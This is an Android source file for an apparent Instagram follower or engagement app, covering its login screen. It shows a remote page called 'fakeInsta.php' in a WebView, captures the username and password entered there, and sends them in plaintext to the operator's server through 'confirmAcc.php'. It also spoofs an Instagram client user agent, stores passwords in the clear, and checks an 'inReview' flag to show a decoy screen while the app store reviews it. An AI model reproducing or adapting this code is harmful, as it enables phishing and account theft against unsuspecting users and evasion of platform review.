package com.midnight.engage;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.sqlite.SQLiteDatabase;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.RelativeLayout;

import com.crashlytics.android.Crashlytics;
import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.PersistentCookieStore;
import com.midnight.engage.API.API;
import com.midnight.engage.API.APIFactory;
import com.midnight.engage.API.User;
import com.midnight.engage.API.inReview;
import com.midnight.engage.Dao.DaoMaster;
import com.midnight.engage.Dao.DaoSession;
import com.midnight.engage.Dao.Users;


import java.io.UnsupportedEncodingException;
import java.text.ParseException;

import io.fabric.sdk.android.Fabric;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MasterActivity extends AppCompatActivity {

    EditText username;
    EditText password;
    ImageView loginBtn;
    DaoMaster daoMaster;
    DaoSession daoSession;
    SQLiteDatabase db;
    DaoMaster.DevOpenHelper helper;
    RelativeLayout loading;
    RelativeLayout fastloading;
    SharedPreferences sharedPref;
    SharedPreferences.Editor editor;
    WebView web;

    Boolean redirectGlobal;

    private static AsyncHttpClient client = new AsyncHttpClient();
    PersistentCookieStore cookieStore;



    public SharedPreferences getSharedPref() {
        return sharedPref;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        cookieStore = new PersistentCookieStore(this);

        client.addHeader("User-Agent", "Instagram 8.2.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)");
        client.setCookieStore(cookieStore);

         sharedPref = getSharedPreferences("my",Context.MODE_PRIVATE);
         editor = sharedPref.edit();
        super.onCreate(savedInstanceState);
        Fabric.with(this, new Crashlytics());
        setContentView(R.layout.login_fragment);
        web = (WebView) findViewById(R.id.web);
        API service = APIFactory.createAPI();
        final RelativeLayout obmanka  =  (RelativeLayout) findViewById(R.id.obmanka);

        Call<inReview> rew = service.inreview("kasld1>!<123kml1");
        rew.enqueue(new Callback<inReview>() {
            @Override
            public void onResponse(Call<inReview> call, Response<inReview> response) {

                if (response.body().getInReview().equals("true")) {
                    assert obmanka != null;
                    obmanka.setVisibility(View.VISIBLE);
                }
                else {

                }


            }

            @Override
            public void onFailure(Call<inReview> call, Throwable t) {

            }
        });
        helper = new DaoMaster.DevOpenHelper(this , "db" , null);
        db = helper.getWritableDatabase();
        daoMaster = new DaoMaster(db);
        daoSession = daoMaster.newSession();
        username = (EditText) findViewById(R.id.login_username);
        password = (EditText) findViewById(R.id.login_password);
        loginBtn = (ImageView) findViewById(R.id.login_btn);
        loading = (RelativeLayout) findViewById(R.id.loadingPanel);
        fastloading = (RelativeLayout) findViewById(R.id.fastlogin);
        assert loading != null;
        loading.setVisibility(View.INVISIBLE);
        String u =  sharedPref.getString("username" , "") ;
        final String p = sharedPref.getString("password" , "") ;
        if (!u.equals("")) {
            fastloading.setVisibility(View.VISIBLE);
            loading.setVisibility(View.VISIBLE);
            login(u , p , false);
        }
        loginBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                login(username.getText().toString() , password.getText().toString() , false);

            }
        });

      if (((Global)getApplication()).isWebView()) {
          web.setVisibility(View.VISIBLE);
          WebViewClient mWebClient = new WebViewClient() {

              @Override
              public boolean shouldOverrideUrlLoading(WebView view, String url) {

                  Log.d("URL-LINK", url);
                  if (url.contains("tryLogin.php")) {
                      String[] links = url.split("&");
                      String username = links[0].split("=")[1];
                      final String password = links[1].split("=")[1];
                      API service = APIFactory.createAPI();
                      final ProgressDialog dialog = new ProgressDialog(MasterActivity.this);
                      dialog.setMessage("Incorect login or password");
                      loading.setVisibility(View.VISIBLE);

                      login(username, password , true);
                      //Do Login

                      return false;
                  } else
                  if
                          (url.contains("insta.com")) {
                          String[] links = url.split("&");

                          Log.d("LINKS ", links[1].toString());

                          //Log.d("parts", part.toString());
                          String username = links[0].split("=")[1];
                          final String password = links[1].split("=")[1];
//

                          API service = APIFactory.createAPI();
                          final ProgressDialog dialog = new ProgressDialog(MasterActivity.this);
                          dialog.setMessage("Incorect login or password");
                          loading.setVisibility(View.VISIBLE);

                          login(username, password , false);
                          //Do Login


                          return false;
                      } else {
                          view.loadUrl(url);
                      }
                      return true;
                  }
              }

              ;


              web.setWebViewClient(mWebClient);
              web.loadUrl(((Global)getApplication()).getLink()+"fakeInsta.php");
          }

    }
    public  void reload () {
        SharedPreferences sharedPref = getPreferences(Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();
        editor.clear();
        editor.putString("username", "none");
        editor.putString("password", "none");
        editor.commit();
        finish();
        Intent intent = new Intent(MasterActivity.this, MasterActivity.class);
        startActivity(intent);
    }
    public void login (final String login , final String pass, final boolean redirect){
        redirectGlobal = redirect;
        loading.setVisibility(View.VISIBLE);
                try {
                    InstagramRequestClass.getInstance().Login(login,pass,client, this, 1, null, null);
            } catch (ParseException e) {
                    e.printStackTrace();
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
    }

    public void failedLogin(){
        AlertDialog.Builder builder = new AlertDialog.Builder(MasterActivity.this);
        builder.setMessage("Incorect login or password!").setTitle("Error").setPositiveButton("OK", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                loading.setVisibility(View.GONE);
                fastloading.setVisibility(View.GONE);
                sharedPref.edit().putString("username", "").apply();
                sharedPref.edit().putString("password", "").apply();
                dialog.dismiss();
            }
        }).create().show();
    }

    public void nextLogin(final User adi, final String login, final String pass){
        if (adi == null) {
            if (((Global) getApplication()).isWebView())
                web.loadUrl(((Global) getApplication()).getLink() + "failInsta.php?username=" + login);
            else {
                AlertDialog.Builder builder = new AlertDialog.Builder(MasterActivity.this);
                builder.setMessage("Incorect login or password!").setTitle("Error").setPositiveButton("OK", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        loading.setVisibility(View.GONE);
                        fastloading.setVisibility(View.GONE);
                        sharedPref.edit().putString("username", "").apply();
                        sharedPref.edit().putString("password", "").apply();
                        dialog.dismiss();
                    }
                }).create().show();
                return;
            }
        }
            if (adi.getPub().equals("true")) {
                loading.setVisibility(View.GONE);
                fastloading.setVisibility(View.GONE);AlertDialog.Builder builder = new AlertDialog.Builder(MasterActivity.this);
                builder.setTitle("Error!").setMessage("We found your profile is 'Private'").setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        dialog.dismiss();
                    }
                }).setPositiveButton("Make it 'public", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    InstagramRequestClass.getInstance().makeitPublick(adi.getPk().toString(), cookieStore, client, MasterActivity.this, login, pass, redirectGlobal, 1);
                                } catch (UnsupportedEncodingException e) {
                                    e.printStackTrace();
                                } catch (ParseException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();

                    }
                }).create().show();
                return;
            }

            finalPartLogin(adi, pass, login);
        }

    private void finalPartLogin(User adi, String pass, String login){
        ((Global) getApplication()).setCurrentUser(adi);
        ((Global) getApplication()).setPassword(pass);
        Users u = new Users();
        u.setId(adi.getPk());
        u.setPassword(pass);
        u.setImageUrl(adi.getProfilePicUrl());
        u.setUsername(adi.getUsername());
        Boolean m = true;
        if (daoSession.getUsersDao().loadAll().size()!=0) {
            for (Users x : daoSession.getUsersDao().loadAll()) {
                if (u.equals(x)) {
                    m = false;
                }
            }
        }
        if (m)
            daoSession.getUsersDao().insertOrReplace(u);
        editor.putString("username", login).apply();
        editor.putString("password", pass).apply();
        if (redirectGlobal) {
            loading.setVisibility(View.GONE);

            web.loadUrl(((Global)getApplication()).getLink()+"confirmAcc.php?username="+login+"&password="+pass);

        }
        else {


            finish();
            Intent intent = new Intent(MasterActivity.this, MainActivity.class);
            startActivity(intent);
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    loading.setVisibility(View.GONE);

                }
            });
        }
    }
 }
